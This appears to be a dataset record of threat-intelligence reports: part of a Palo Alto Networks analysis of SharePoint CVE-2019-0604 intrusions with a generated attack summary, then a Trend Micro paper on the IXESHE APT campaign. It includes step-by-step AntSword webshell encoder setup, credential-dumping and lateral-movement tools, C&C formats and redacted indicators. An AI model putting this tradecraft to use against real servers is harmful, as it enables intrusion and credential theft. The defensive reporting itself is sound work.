3 FileManager interface within AntSword’s Shell Manager using the webshellThe actor issued commands to the webshell using these uploaded tools. For instance, the cURL tool was used in the command curl.exe ipinfo.io —max–time 5 to determine if the server had outbound access to the Internet and to obtain the external IP address of the compromised system. The actors used the ‘net use’ command, Mimikatz and the Impacket tools speciﬁcally for lateral movement. It appears the actors used Mimikatz to dump credentials from memory (T1003) and used the Impacket tools to use the pass the hash (T1075) technique to run commands on other systems. Actor’s Custom AntSword Encoder To use the AntSword webshell installed on the SharePoint server, the actor had to create a custom encoding module in AntSword. We know this as the default encoders in the AntSword Shell Manager were unable to successfully interact with the bitreeview.aspx webshell. We found that the default base64 encoder would not base64 encode the data in the Darr1R1ng ﬁeld, rather it would deliver it in cleartext, as seen in HTTP POST request seen in Figure 4. When we attempted to use the default base64 encoder to interact with the bitreeview.aspx webshell installed by the threat actor, the server responded with HTTP 500 error messages as the cleartext Darr1R1ng ﬁeld contained characters that were not in the base64 alphabet.url Still Exploiting SharePoint Vulnerability to Attack Middle East Government OrganizationsFigure 4 HTTP POST request issued by AntSword Shell Manager to webshell using default base64 encoderWe determined that the actor must have created a custom encoding module in the AntSword Shell Manager that base64 encoded the entire Darr1R1ng ﬁeld to successfully interact with the bitreeview.aspx webshell. The AntSword Shell Manager includes an interface for a user to create a custom encoding module, so we set out to determine the steps the actor would take to be able to create this custom encoding to start interacting with the webshell.1. The actor would ﬁrst start by opening the AntSword Shell Manager. Based on our analysis, they used AntSword v2.1 speciﬁcally.2. Before interacting with the installed webshell, the actor had to create a custom encoding module. To create the custom encoding module, the actor would click the AntSword > Encoders manager from the menu.3. In the Encoder Manager interface, the actor would click the New Encoder button.url Still Exploiting SharePoint Vulnerability to Attack Middle East Government Organizations4. From the New Encoder drop down, the actor would select ASPX as the AntSword webshell installed on the SharePoint server was an ASPX ﬁle.5. The actor would have to name the new encoder and click the blue button to continue. We chose the default name ‘myencoder’ for this example.6. After creating the new encoder, the actor would select the encoder and click the Edit menu button.url Still Exploiting SharePoint Vulnerability to Attack Middle East Government Organizations7. After clicking the Edit button, the EditEncoder window opens and provides an example encoder that the actor can modify. To use the ‘bitreeview.aspx’ webshell on the server, the actor must have modiﬁed line 24 of the example encoder to base64 encode the contents ‘Darr1R1ng’ ﬁeld instead of leaving them in cleartext.8. To base64 encode the ‘Darr1R1ng’ ﬁeld, the actor would modify line 24 to code that has the same functionality as the code displayed in line 24 now. The actor would click the Save menu button to save the new custom encoding module.9. With the custom encoding module created, the actor would now add a new shell in the Shell Manager window by right clicking and selecting the Add button.url Still Exploiting SharePoint Vulnerability to Attack Middle East Government Organizations10. The Add shell interface opens and allows the actor to conﬁgure the location of the shell, the name of the ﬁeld within the HTTP POST request and the encoding module the webshell will use to interact with the Shell Manager.11. In this incident, the actor would have added the following settings and clicked the Add menu button:1.1. Set ‘Shell url’ to URL to the ‘bitreeview.aspx’ webshell (localhost in our testing) 2. Set ‘Shell pwd’ to the word ‘Darr1R1ng’ 3. Set ‘Shell type’ to “ASPX” from the drop down 4. Checked the radio box next to ‘myencoder’ to select the custom encoder.url Still Exploiting SharePoint Vulnerability to Attack Middle East Government Organizations12. After clicking the Add button, the shell is now listed within the Shell Managers interface.13. To interact with the webshell, the actor would right click the shell and choose actions from the displayed menu. To run commands on the webserver, the actor would select the Terminal menu button.url Still Exploiting SharePoint Vulnerability to Attack Middle East Government Organizations14. The AntSword Shell Manager displays an interface that resembles a command prompt window. It also includes information about the system that the webshell is running on, such as the operating system, current user, current working directory and the storage volumes on the server.15. The actor would issue the desired commands in this window, which the webshell would run and respond with the results.16. If the actor wished to interact directly with the compromised server’s ﬁle system, they could choose the FileManager menu button from the Shell Manager.url Still Exploiting SharePoint Vulnerability to Attack Middle East Government OrganizationsAntSword Similarity to China Chopper AntSword and China Chopper are both modular webshells that actors would interact with using a client application instead of a web browser. It appears that developers of AntSword may have used China Chopper as a basis for their tool, as the default China Chopper webshell works with the default encoder of AntSword’s ASPX webshell. The major differences between the two involves the code and parameters the two client applications send to the webshell to run commands and other activities. For instance, China Chopper uses two parameters named z1 and z2 when running commands via the webshell, as seen in Figure 5, whereas AntSword uses four randomly generated names each execution, as seen in Figure 6.Figure 5 HTTP POST request to China Chopper webshell to run a command with arrows pointing to its requiredparametersurl Still Exploiting SharePoint Vulnerability to Attack Middle East Government OrganizationsFigure 6 HTTP POST request to AntSword webshell to run a command with arrows pointing to its requiredparametersNot only do the parameters differ, but the code sent to the webshell differs as well. As you can see in Figure 7, the code used to run commands on the webshell by AntSword and China Chopper have several lines of code that are exactly the same, while some lines of code differ and several lines were added to AntSword’s code on the right. The code on the right side of Figure 7 is AntSword, which includes additional lines of code to allow the actor to set environment variables before running the command.Figure 7 Comparison between code used by AntSword and China Chopper to run a command on the webshell Tools Seen in Related Webshell When analyzing tools uploaded to the AntSword webshell, we discovered the same Mimikatz sample uploaded to a webshell hosted on a server at another government organization in a different Middle Eastern country. On September 19, 2019, the actor uploaded this Mimikatz sample to the webshell hosted at a URL:<redacted domain>/uploadedFiles/green_post.aspxurl Still Exploiting SharePoint Vulnerability to Attack Middle East Government OrganizationsWe did not have access to the webshell hosted at this URL or visibility into the commands executed by the actor. We also do not know if the server is a SharePoint server or if a vulnerability was exploited to install the webshell. However, the Mimikatz sample was unique as it used a custom loader written in .NET, so we believe that the same threat group is involved in the intrusions at both of these government organizations.In addition to the Mimikatz tool, the actor uploaded other tools to the webshell hosted at this second organization. Table 2 shows the executables uploaded to the webshell, which shows similar tools that actors uploaded to the AntSword webshell discussed earlier, including Mimikatz and Impacket’s atexec tool.Filename DescriptionSHA256 da53dcaeed es.exe 26d9212ec8 Rar.exe e4e05c9a21 dmp.exeMimikatz with custom loader Legitimate WinRAR Compiled Impacket atexec tool Dumpert toolTable 2 Tools uploaded to webshell hosted at second government organizationOne of the tools seen in Table 2 that caught our interest was the Dumpert tool, which is freely available on Outﬂanknl’s GitHub repository. The author of Dumpert describes the tool as an LSASS dumping tool that uses direct system calls and API unhooking to evade antivirus and EDR solutions. Dumpert is a relatively new tool with its initial commit to GitHub occurring on June 17, 2019. While the Dumpert tool is meant to help red teams emulate an adversary, we had not seen this tool used by threat actors until it was uploaded to this related webshell on September 23, Threat actors continue to exploit the CVE-2019-0604 vulnerability to compromise SharePoint servers, which is a vulnerability that Microsoft released a patch for in March 2019. We observed actors installing webshells to the SharePoint server that they use to run commands and upload additional tools to in order to dump credentials and move laterally to other systems on the network. We were also able to ﬁnd a related webshell based on the threat group’s tool reuse, speciﬁcally a custom Mimikatz sample. Thanks to this tool reuse, we found the threat group uploading a credential dumping tool called Dumpert that we had not seen used in prior incidents involving the exploitation of CVE-2019-0604.Palo Alto Networks customers are protected by:The CVE-2019-0604 vulnerability is covered by our IPS signature Microsoft SharePoint Remote Code Execution Vulnerability (55411) The Awen Webshell is detected by our IPS signature Webshell.ASPX.git.Awen Command and Control Trafﬁc (83202)url Still Exploiting SharePoint Vulnerability to Attack Middle East Government OrganizationsThe AntSword ASPX Webshell is detected by our IPS signature AntSword Webshell Command and Control Trafﬁc Detection (85561, 85562, 85563) The Mimikatz, Impacket atexec and Dumpert tools are all marked with malicious verdicts by WildFire.Indicators of CompromiseAwen Webshell Get updates from Palo Alto Networks! Sign up to receive the latest news, cyber threat intelligence and research from usBy submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement.© 2020 Palo Alto Networks, Inc. All rights reserved.url "," 1. The attackers exploit CVE-2019-0604, a SharePoint vulnerability, to gain initial access to a Middle East government organization's SharePoint server. 2. The exploitation installs an Awen webshell on the SharePoint server. 3. The attackers use the Awen webshell to run commands and conduct reconnaissance on the compromised system. 4. The attackers install another webshell called AntSword on the SharePoint server. 5. The attackers interact with the AntSword webshell using a client tool and custom encoder. 6. The attackers use the AntSword webshell to upload tools like Mimikatz and Impacket to the server. 7. Mimikatz is used to dump credentials from the compromised SharePoint server. 8. The Impacket tools are used to execute commands on other systems using the dumped credentials. 9. The same Mimikatz variant is uploaded to a webshell on another government organization's server, suggesting the same threat actor. 10. The modular webshells allow the attacker to control the compromised servers and move laterally in the network. ",valid_79,"['CVE-2019-0604', 'SharePoint Vulnerability', 'initial access', 'a Middle East government organization', 'the exploitation', 'the SharePoint server', 'Use', 'The Awen Webshell', 'commands', 'the compromised system', 'another webshell', 'the AntSword webshell', 'custom encoder', 'Mimikatz', 'the server', 'the Impacket tools', 'other systems', 'dumped credentials', 'a webshell', 'another government organization', 'actor', '10', 'webshells', 'the compromised server', 'servers', 'the network']",CVE-2019-0604; SharePoint Vulnerability; initial access; a Middle East government organization; the exploitation; the SharePoint server; Use; The Awen Webshell; commands; the compromised system; another webshell; the AntSword webshell; custom encoder; Mimikatz; the server; the Impacket tools; other systems; dumped credentials; a webshell; another government organization; actor; 10; webshells; the compromised server; servers; the network.
"Trend Micro Incorporated An APT CampaignBy: David Sancho, Jessa dela Torre, Matsukawa Bakuei, Nart Villeneuve, and Robert McArdleCONTENTSIntroduction 1 Victims and Targets 1 Context 1 Attack Vectors 2 Operations 2 Technical Analysis 2 Initial Delivery Method 2 Malware Local System Effects 2 C&C Communications 3 Related AES Campaign 4 C&C Infrastructure 5 Real C&C Location 6Attribution and Unique Fingerprints 7 Unique Fingerprints and Modus Operandi 7 Relationships Between Attack Components 8 Defending Against APTs 15 Local and External Threat Intelligence 15 Mitigation and Cleanup Strategy 16 Educating Employees Against Social Engineering 16 Data-Centric Protection Strategy 16Trend Micro Threat Protection Against IXESHE Campaign Components 17PAGE ii | iXESHEINTRODUCTIONThe number of targeted attacks is undoubtedly on the rise. These highly targeted attacks focus on individual organizations in an effort to extract valuable information. In many ways, this is a return to the “old hacking days” before more widespread attacks targeting millions of users and the rise of computer worms came about. Sometimes, these targeted attacks are allegedly linked to state-sponsored activities but may also be carried out by individual groups with their own goals.Trend Micro continues to track and analyze highly targeted attacks, also known as “advanced persistent threats (APTs).” We have, in fact, published two research papers on the Luckycat1 and Lurid2 campaigns. This research paper will delve into another prominent group of attackers referred to as “IXESHE” (pronounced “i-sushi”), based on one of the more common detection names security companies use for the malware they utilize. This campaign is notable for targeting East Asian governments, electronics manufacturers, and a telecommunications company.The IXESHE campaign makes use of targeted emails with malicious attachments to compromise victims’ systems. The emails are often tailored for specific victims and contain malicious attachments that are almost always “weaponized” .PDF files with known exploits that drop malware executables onto targeted systems. In addition, the IXESHE attackers conducted two specific attacks that leveraged zero-day exploits—one in 2009 and another in 2011.1 url url IXESHE attackers almost always make use of compromised servers as command-and-control (C&C) servers. In some cases, the compromised servers are hosted on target organizations’ networks after successful infiltration so the attackers can increase their control of the victims’ infrastructure. Using this approach, the attackers amassed at least 60 C&C servers over time. This technique also allows the attackers to cover their tracks, as having the C&C server in the victims’ corporate networks means very little C&C traffic leaves them. The attackers’ deliberate use of compromised machines and dynamic Domain Name System (DNS) services allows them to hide traces of their presence by confusing their activities with data belonging to legitimate individuals.Looking at threat intelligence derived from tracking APT campaigns over time primarily based on the network traffic generated by the malware used, we were able to develop indicators of compromise for the IXESHE campaign. The malware samples used in this campaign were not very complicated by nature but do give the attackers almost complete control over their targets’ compromised systems.Victims and targetsMost of the IP addresses of IXESHE’s victims are linked to DSL networks, which made it difficult to determine their identities. Careful research, however, allowed the identification of some of the attackers’ victims:• East Asian governments • Taiwanese electronics manufacturers • A telecommunications companyCampaign victims were identified by using Whois records and open source research. Trend Micro generally notifies customers that are believed to have been specifically targeted by APT campaigns.contextThe IXESHE attackers have been actively launching highly targeted attacks since at least July 2009.PAGE 1 | iXESHETECHNICAL ANALYSISattack Vectorsinitial deliVery methodAvailable data on the IXESHE campaign indicates that targeted emails with malicious .PDF file attachments were the attackers’ vector of choice. In most cases, the attacks involved Adobe Acrobat, Reader, and Flash Player exploits such as:• CVE-2009-43243 • CVE-2009-09274 • CVE-2011-06095 • CVE-2011-06116It should also be noted that this campaign used CVE-2009- 43247 and CVE-2011-06098 exploits when these were still unpatched or considered zero-day vulnerabilities.The IXESHE attackers also used an exploit that affected Microsoft Excel—CVE-2009-3129.9operationsThe IXESHE malware binary allowed the attackers to easily take over and maintain complete control of victims’ systems to do the following:• List all services, processes, and drives • Terminate processes and services • Download and upload files • Start processes and services • Get victims’ user names • Get a machine’s name and domain name • Download and execute arbitrary files • Cause a system to pause or sleep for a specifiednumber of minutes• Spawn a remote shell • List all current files and directories3 url 4 url 5 url 6 url 7 url url url 2 | iXESHEEvery IXESHE case we examined revealed that the original infection vector was a targeted email with a PDF exploit as attachment. Older versions also used an XLS exploit.Opening the .PDF file drops and executes a malware in a victim’s system. The malware displays a blank .PDF file or a decoy document related to the targeted attack. The emails normally come from compromised personal accounts or are entirely spoofed. Emails from spoofed senders were usually sent via mail servers in the United States and China.malware local system effectsOnce dropped onto target systems by means of a document exploit attached to a tailored email, the malware drops an executable file into one of the following folders:• %APPDATA%\Locations\ • %APPDATA%\Adobe • %TEMP%The malware also sets the executable file’s attributes to “Hidden.” Some of the file names the attackers used include:• winhlps.exe • Updater.exeIn order for the malware to survive rebooting, it normally creates the following registry run key:HKEY_CURRENT_USER\Software\Microsoft\Windows\ CurrentVersion\Run The registry run key, in turn, points to the malware that has been dropped. The value name of this entry varies from sample to sample. Some of the names the attackers used for it include:• Adobe Assistant • MigratedSome samples, however, do not use a registry run key as load point. Some of the more recent samples we observed create a shortcut (i.e., .LNK file) in the Startup folder with names such as adobe reader speed launch.lnk.The malware also checks a system’s proxy settings for later use in C&C communications:HKEY_CURRENT_USER\Software\Microsoft\Windows\ CurrentVersion\Internet SettingsProxyEnable ProxyServerc&c communicationsUpon installation, the malware starts communicating with one of its C&C servers. Most of the samples appeared to have at least three C&C servers hard coded for redundancy. The C&C communications are easy to identify, as these tended to be coded in the following predetermined format:url Server]/[ACD] [EW]S[Some Numbers]. jsp?[Encrypted Base64 Blob] Some samples alternatively use an FGKD.jsp or an FPK.jsp file.The Base64 blob is of particular interest. It makes use of a custom Base64 alphabet. Once decoded, this blob reveals a standardized structure of the information sent to the registered C&C server, which includes the following details:• Computer name • Local IP address • Proxy server IP and port • Malware IDTo date, we have seen several custom Base64 alphabets, including:• +NO5RZaGHviIjhYq8b4ndQ=p012ySTcCDrs/xPgUz67FM3wemKfkJLBo9VtWXlEuA• HZa4vjIiGndQ=p012y+NO5RST/xPgUz67FMhYq8b3we•mKfkJLBocCDrs9VtWXlEu j4vpGZaHnIdQ=i012y+N/zPgUO5RSTx67FMhYb8q3we mKckJLBofCDrs9VtWXlEu• p12kJLBofCDrs9VtWXlEuainyj4vd+=H0GZIQNO5RST/zPgUx67FMhYb8q3wemKc• aZHGviIj4ndQ=p012y+NO5RST/xPgUz67FMhYq8b3wemKfkJLBocCDrs9VtWXlEu• ZvQIajHi4ndG=p012y+NO5RST/xPgUz67FMhYq8b3wemKfkJLBocCDrs9VtWXlEu• ZaGHviIj4ndQ=p012y+NO5RST/xPgUz67FMhYq8b3wemKfkJLBocCDrs9VtWXlEu• 4HIvZGjaiQdn=p012y+NO5RST/xPgUz67FMhYq8b3wemKfkJLBocCDrs9VtWXlEu• pGIaHnZj0vdQ=i421y+NO5RSY/zMgUx67KPhTb8q3wemFckBLJufWErs9VtCXlDo• QpaZIivj4ndG=H021y+NO5RST/xPgUz67FMhYq8b3wemKfkJLBocCDrs9VtWXlEu• pGZaHnIj4vdQ=i012y+NO5RST/zPgUx67FMhYb8q3wemKckJLBofCDrs9VtWXlEuSome similarities exist across different versions of the Base64 alphabet, which indicates that these are most likely not completely randomly generated. Instead, the attackers manually cut and pasted older versions after altering some parts.The malware ID seems to be a campaign code with a different IP address for each attack. Some of the campaign codes we have seen include:• 19 • ZWJP_KS_1222It appears that the numbers in the given campaign codes refer to dates when the campaigns were launched in “MMDD” format. The letters are possibly related to the target industry or company.PAGE 3 | iXESHEIf the malware does not get a response from the C&C server, it will choose another random number after the AWS part of the URL and try again.Once connected, the malware specifically waits for the remote server to issue the following commands, which may vary from one version to another:• del	[parameter]: Allows a remote user to delete files.• disk	[parameter]: Lists all available drives.• dos	[parameter]: Allows a remote user to executecommands via cmd.exe.• get	[parameter]: Allows a remote user to download afile from the remote server onto a local machine.• list	[parameter]: Lists files on the victim’s machine.related aes campaignWe have also been tracking another campaign, which we refer to as the “AES campaign,” which appears to be related to IXESHE. The main body of the malware related to the IXESHE campaign can be identified by its connection to a C&C server using a file such as AWS12345.jsp and a custom Base64 blob; the malware associated with the AES campaign operates very similarly. The samples used in the AES campaign slightly differed in terms of C&C communication but had significant similarities with IXESHE malware, which used the format:url Server]/[ACD] ES[Some Numbers].jsp Even though the network traffic format of the AES campaign was slightly similar, instead of the more familiar AWS[random].jsp format, it used several other formats for certain commands or events such as:• ls	[parameter]: Allows a remote user to display thecontents of a directory.• AES: Initial beacon.• kill	[parameter]: Allows a remote user to terminateprocesses.• put	[parameter]: Allows a remote user to upload a filefrom a local machine to a remote server.• rsh	[parameter]: Similar to the sh or dos [parameter] except for the fact that this is an already-existing file or shell.• run	[parameter]: Allows a remote user to executeprograms.• sh	[parameter]: Allows a remote user to executecommands via cmd.exe.• sleep	[parameter]: Causes a system to sleep for acertain amount of time.• DES: Send the path of %systemdir%.• PES: Send the result of the “put” command.• SEU: Send the “error” or “invalid” command.• SUS: Send the system name, which is not encoded,upon receiving the “exit” command.• ZES: Send the result of the “dos” command.Another difference in the traffic is that AWS uses the POST method with the format, “url Server]/FPK [Some Numbers].jsp?[Base64 Blob],” when the “get” command is invoked. The Base64 blob contains the file specified in the “get” command.Analysis of the binaries also revealed similarities between the AES and AWS samples. These included the encoding algorithm and commands used. Even though some commands varied, the format and parameters used essentially remained the same.PAGE 4 | iXESHEC&C INFRASTRUCTUREThe majority of the IXESHE campaign’s C&C servers were based in Taiwan and the United States.Figure 1. Breakdown of C&C servers by countryPAGE 5 | iXESHEThis is, however, not an indicator of attribution. It is not possible to determine where the attackers are based solely on where their C&C infrastructures are located. In addition, not all of the C&C servers are currently active. Many, if not all of them, appear to be compromised machines. In fact, at least 11 of the C&C servers were hosted on the compromised machines of an East Asian government, which made these very useful for launching targeted attacks against it.Most of the malware samples directly accessed an IP address as a C&C server. Connections to domains did exist in some cases. The domains were usually registered using free dynamic DNS service providers or compromised websites.Overall, this strategy was part of the attackers’ modus operandi. By choosing compromised machines to act as C&C servers, fewer clues were left for investigators to follow in an attempt to find out who is behind the attacks compared with those using bulletproof hosting services and registered domain names. To conduct research on these servers, investigators need to differentiate between information related to malicious and legitimate use.This indicated that the front-end servers actually functioned as proxy servers and that the true C&C servers were hidden behind this initial group of C&C servers. This made the network more resistant to takedown and analysis. Due to a server error, however, the attackers revealed the location of one of their back-end servers. We discovered that the IP address, xx.xx.x2.202, is located in Guangdong, China.The particular error returned looked very similar to errors generated by a tool called “HTran.”10 HTran stands for “HUC Packet Transmit Tool,” a connection bouncer that redirects TCP traffic destined for one host to an alternate host, keeping the real host hidden from view. “HUC,” in this case, stands for the hacking group, “Honker Union of China.” It was coded by a hacker who goes by the handle “lion.” This tool’s error-checking code, however, is flawed. Assuming that everything properly works, the tool functions very well as a proxy server but if the real server is currently inaccessible, HTran will send an error message, revealing its whereabouts.Running a port scan on this server revealed some open ports shown in the table below.real c&c locationOne very interesting error revealed more insights into the C&C network’s setup. One of the malware samples we tested was designed to access xxx.xxawan.com via port 443, which, at that time, resolved to xx.xxx.114.87:443, a server located in the United States. The sample, however, received the following error message from the server:[SERVER]connection to xx.xx.x2.202:56413 errorPortStateService80/tcp HTTP AlternativeBased on OS fingerprinting, the server appears to be running Windows 7 Enterprise Server. With only a few open ports, however, it was very difficult to confirm this. In addition, we did not receive a response when we tried to connect to these ports.PAGE 6 | iXESHE10 url AND UNIQUE FINGERPRINTSPrevious research on the IXESHE campaign indicated several connections to groups possibly from China. In addition, the IP address hiding behind the HTran instance was an IP range assigned to China.Upon further investigation of the “manufact” campaign, however, it appears that the gang behind it may be English speakers. The name of the campaign, for one, is most likely a shortened form of “manufacturing.” The OS the C&C server uses is also an English install of Microsoft XP. It is also likely, of course, that the C&C server is a compromised machine so it does not use the attackers’ first language.The malware samples, which appear to have been developed using C++, had a number of strings and error codes in English such as “Enter command” and “Receive command error!”The date format used in the campaign codes (i.e., MMDD) also provided us a clue as to where the attackers may be from. This date format is only commonly used in China, Korea, Iran, Japan, Hungary, Lithuania, and the United States.Based on the limited amount of information we gathered about the attackers, it was very difficult to pinpoint their exact location.unique fingerprints and modus operandiAn attack can be considered associated with the gang behind the IXESHE campaign if it exhibits the following characteristics:• Uses a specially crafted targeted email with amalicious file attachment• Uses document exploits, primarily .PDF files, to dropmalware into target systems• Uses malware detected by security vendors as IXESHEvariants• Uses a malware that sends a GET request to the C&Cserver in the following format:url Server]/[ACD] [EW]S[Some Numbers].jsp?[Encrypted Base64 Blob]• Uses dynamic DNS services for or compromisedmachines as C&C serversPAGE 7 | iXESHERELATIONSHIPS BETWEEN ATTACK COMPONENTSFigure 2. IXESHE targeted campaign #1Figure 3. IXESHE targeted campaign #2PAGE 8 | iXESHEFigure 4. IXESHE targeted campaign #3PAGE 9 | iXESHEPAGE 10 | iXESHEFigure 5. IXESHE targeted campaign #4i5 PTIMELINEThis section lists known incidents exhibiting the same threat actor behaviors and so may be from the same group behind IXESHE dating to as far back as July 2009. With the exception of the samples described in ContagioDump, the dates for other samples refer to when the respective sandboxes saw them for the first time. As such, these dates should be considered “at least by” and not the actual date of the attack.• 15 October 2009• PDF name/Subject hook:  • C&C: xxxxxupsenter.byinter.net •Info: url • C&C: xxx.xx9.124.13 • C&C: xxxxx.compreautos.com.br • C&C: xxxxxfo.athersite.com •Info: url dec-18-adobe-0-day-cve-2009-4324-pdf.html• Campaign code: ML_20091216• 28 December 2009• PDF name/Subject hook: Consumer Welfare Table • C&C: xxx.xx6.148.42 or xxx.xx6.202.49 •Info: url dec-29-cve-2009-4324-adobe-0-day.html• Campaign code: ML_20091223• 26 April 2010• PDF	name/Subject	hook: [] 「」 • C&C: xxx.x.x5.26 • C&C: xxx.xx.187.130 • C&C: xxx.xx.128.71 • C&C: xxx.xx.128.71 • C&C: xxx.xx6.54.189 • Info: url • C&C: xxxxxck.dnsrd.com or xxx.xx6.34.94 (appearsto be a compromised computer of an East Asian university)• Info: url• Campaign	code: [0802]• 17 August 2010• PDF	name/Subject	hook: [Unknown] • C&C: xxxxxck.dnsrd.com or xxx.xx6.34.94 (appearsto be a compromised computer of an East Asian • C&C: xx.xx.x3.102 • C&C: xx.xx.x0.244 • C&C: xx.xx.x9.165 • C&C: xx.xx.x9.165 • C&C: xx.xx.x9.165 • Info: url• Campaign	code: [Removed due to privacyconcerns]• 22 February 2011• 22 April 2011• PDF	name/Subject	hook: [Unknown] • C&C: xxx.xx.228.58 • C&C: xx.xx.x9.165 • Info: url • C&C: xx.xxx.114.44 • C&C: xxx.xxawan.com or xxx.xx4.230.120 • Info: url• Campaign	code: 19• 3 November 2011• PDF	name/Subject	hook: [Unknown] • MD5: E25DBA0556124D7874D8416DE291CFE2 • C&C: xxxxxfo.sdti.tw or xxx.xx2.246.110 • C&C: xxxxxaga.chickenkiller.com • C&C: xxx.xx6.54.150 or xxxxx.ItemDB.com • C&C: xx.xx.x33.2 • C&C: xxxxxain.qpoe.com • C&C: xxxxxfo.AtHerSite.com • C&C: xxx.xx0.139.67 • C&C: xxx.xx0.63.1 • C&C: xx.xxx.21.41 or king.pirat3.com targeted attacks since 2009. The attackers primarily use malicious .PDF files that exploit vulnerabilities in Adobe Reader, Acrobat, and Flash Player, including the use of two zero-day exploits—one in 2009 and another in 2011. While the attackers primarily targeted East Asian governments in the past, they have also started targeting a telecommunications company and electronics manufacturers. They kept track of their targeted attacks by embedding a “campaign tag” in the malware that appears to describe when each attack was launched and, in some cases, the nature of its target. We found more than 40 of these campaign tags.The IXESHE attackers are notable for their use of compromised machines within a target’s internal network as C&C servers. This helped disguise their activities. In addition, the attackers’ use of the proxy tool, HTran, also helped mask their true location. While their identities remain unknown, the attackers behind the IXESHE campaign demonstrated that they were both determined and capable. While the malware used in the attacks were not very complicated by nature, these proved very effective. This campaign remains an active threat.Sufficiently motivated threat actors can penetrate even networks that use moderately advanced security measures. As such, apart from standard and relevant attack prevention measures and mechanisms such as solid patch management; endpoint and network security; firewall use; and the like, enterprises should also focus on detecting and mitigating attacks. Moreover, data loss prevention (DLP) strategies that identify the data an organization is protecting and take into account the context of data use should be employed.local and external threat intelligenceThreat intelligence refers to indicators that can be used to identify the tools, tactics, and procedures threat actors engaging in targeted attacks utilize. Both external and local threat intelligence is crucial for developing the ability to detect attacks early. The following are the core components of this defense strategy:• Enhanced	visibility: Logs from endpoint, server,and network monitoring are an important and often underused resource that can be aggregated to provide a view of the activities within an organization that can be processed for anomalous behaviors that can indicate a targeted attack.• Integrity	checks: In order to maintain persistence,malware will make modifications to the file system and registry. Monitoring such changes can indicate the presence of malware.• Empowering	the	human	analyst: Humans are best positioned to identify anomalous behaviors when presented with a view of aggregated logs from across a network. This information is used in conjunction with custom alerts based on the local and external threat intelligence available.Technologies available today such as Deep Discovery provide visibility, insight, and control over networks to defend against targeted threats.11 Deep Discovery uniquely detects and identifies evasive threats in real time and provides in-depth analysis and actionable intelligence to prevent, discover, and reduce risks.11 url 15 | iXESHEmitigation and cleanup strategydata-centric protection strategyThe ultimate objective of targeted attacks is to acquire sensitive data. As such, DLP strategies that focus on identifying and protecting confidential information are critical. Enhanced data protection and visibility across an enterprise provides the ability to control access to sensitive data as well as monitor and log successful and unsuccessful attempts to access it. Enhanced access control and logging capabilities allow security analysts to locate and investigate anomalies, respond to incidents, and initiate remediation strategies and damage assessment.Once an attack is identified, the cleanup strategy should focus on the following objectives:• Determine the attack vector and cut offcommunications with the C&C server.• Determine the scope of the compromise.• Assess the damage by analyzing the data and forensicartifacts available on compromised machines.Remediation should be applied soon afterward, which includes steps to fortify affected servers, machines, or devices into secure states, informed in part by how the compromised machines were infiltrated.educating employees against social engineeringSecurity-related policies and procedures combined with education and training programs are essential components of defense. Traditional training methods can be fortified by simulations and exercises using real spear-phishing attempts sent to test employees. Employees trained to expect targeted attacks are better positioned to report potential threats and constitute an important source of threat intelligence.PAGE 16 | iXESHETREND MICRO THREAT PROTECTION AGAINST IXESHE CAMPAIGN COMPONENTSThe following table summarizes the Trend Micro solutions for the components of the IXESHE campaign. Trend Micro recommends a comprehensive security risk management strategy that goes further than advanced protection to meet the real-time threat management requirements of dealing with targeted attacks.Attack ComponentProtection TechnologyTrend Micro SolutionPredetermined C&C communication format: url Server]/ [ACD] [EW]S[Some Numbers]. jsp?[Encrypted Base64 Blob]Web ReputationTROJ_PIDIEF, BKDR_PROXY, TROJ_ DROPR, and TROJ_DEMTRANC variantsFile Reputation (Antivirus/Anti-malware)CVE-2009-4324 CVE-2009-0927 CVE-2011-0609 CVE-2011-0611 CVE-2009-3129Vulnerability Shielding/Virtual PatchingEndpoint (Titanium, Worry-Free Business Security, OfficeScan) Server (Deep Security) Messaging (InterScan Messaging Security, ScanMail Suite for Microsoft Exchange) Network (Deep Discovery) Gateway (InterScan Web Security, InterScan Messaging Security) Mobile (Mobile Security) Endpoint (Titanium, Worry-Free Business Security, OfficeScan) Server (Deep Security) Messaging (InterScan Messaging Security, ScanMail Suite for Microsoft Exchange) Network (Deep Discovery) Gateway (InterScan Web Security, InterScan Messaging Security) Mobile (Mobile Security) Server (Deep Security) Endpoint (OfficeScan with Intrusion Defense Firewall Plug-In)For CVE-2009-4324:• Rule #1004008 (Adobe Reader andAcrobat ‘newplayer()’ JavaScript Method Code Execution)For CVE-2009-0927:• Rule # 1003405 (Adobe AcrobatJavaScript getIcon Method Buffer Overflow)For CVE-2011-0609:• Rule #1004615 (Adobe Flash PlayerXLS Remote Code Execution)For CVE-2011-0611:• Rule # 1004647 (Restrict MicrosoftOffice File with Embedded SWF)For CVE-2009-3129:• Rule #1003817 (Excel FeatheaderRecord Memory Corruption Vulnerability)PAGE 17 | iXESHEAttack ComponentProtection TechnologyTrend Micro SolutionWeb, Domain, and IP ReputationEndpoint (Titanium, Worry-Free Business Security, OfficeScan) Server (Deep Security) Messaging (InterScan Messaging Security, ScanMail Suite for Microsoft Exchange) Network (Deep Discovery) Gateway (InterScan Web Security, InterScan Messaging Security) Mobile (Mobile Security)xxx.x.x87.206 xxx.xx2.36.5 xxx.xx6.129.228 xxx.xx0.139.67 xxx.xx.39.184 xx.xxx.12.18 xxx.xxrver.us xxx.xxt-alice.de xxxxxbaby.mooo.com xxxxxlic.yahoobigdeals.com xx.xx.x1.252 xxx.xx.228.58 xxx.xx.183.86 xxx.xx.128.71 xxx.xx.13.148 xxx.xx5.243.44 xxx.xx2.216.5 xxx.xx.151.190 xxx.xx.63.113 xxx.xx.58.110 xxx.xx.111.151 xxx.xx6.54.150 xxx.xx4.230.120 xxx.xx0.139.67 xxx.xx2.246.110 xx.xxx.223.3 xx.xx.x3.102 xx.xx.x9.165 xx.xx.x0.244 xx.xx.x33.2 xxxxxa.2waky.com xxx.xxawan.com xxxxxmic.dyndns-wiki.com xxxxxain.qpoe.com xxx.xxrver.us xxxxxfo.AtHerSite.com xxxxxem.passingg.as xxx.xxset.com xxxxx.dnset.com xxxx.xirat3.com xxxxxaga.chickenkiller.com xxxxx.otzo.com xxxxxck.dnsrd.com xxxxx.portrelay.com xxxxx.FindHere.orgPAGE 18 | iXESHE PAGE 18 | iXESHEMay 2012 | APT Campaign Quick Profile: IXESHEAdvanced persistent threats (APTs) refer to a category of threats that aggressively pursue and compromise specific targets to maintain persistent presence within the victim’s network so they can move laterally and exfiltrate data. Unlike indiscriminate cybercrime attacks, spam, web threats, and the like, APTs are much harder to detect because of the targeted nature of related components and techniques. Also, while cybercrime focuses on stealing credit card and banking information to gain profit, APTs are better thought of as cyber 